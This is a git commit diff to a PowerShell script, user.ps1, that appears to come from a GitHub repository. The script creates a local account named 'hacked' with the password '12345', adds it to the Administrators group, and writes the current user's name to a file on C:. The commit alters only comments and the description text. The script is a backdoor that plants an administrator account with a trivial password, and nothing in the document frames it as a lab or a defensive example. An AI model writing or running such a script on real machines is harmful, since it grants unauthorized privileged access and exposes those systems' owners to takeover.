7be5d3a7e155ee17d6a18f148d7cfbe58859de83
tim104979 <73826327+tim104979@users.noreply.github.com>
2024-10-08 17:06:08 +0200

    Update user.ps1

--- user.ps1
+++ user.ps1
@@ -1,7 +1,7 @@
-# Create a new user
-New-LocalUser -Name "hacked" -Description "New user with admin rights" -Password (ConvertTo-SecureString "12345" -AsPlainText -Force)
+# Create a new user account
+New-LocalUser   -Name "hacked" -Description "Hacked User" -Password (ConvertTo-SecureString "12345" -AsPlainText -Force)
 
-# Add the user to the Administrators group
+# Add the user to the local Administrators group
 Add-LocalGroupMember -Group "Administrators" -Member "hacked"
 
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName | Out-File -FilePath "C:/online_users.txt"
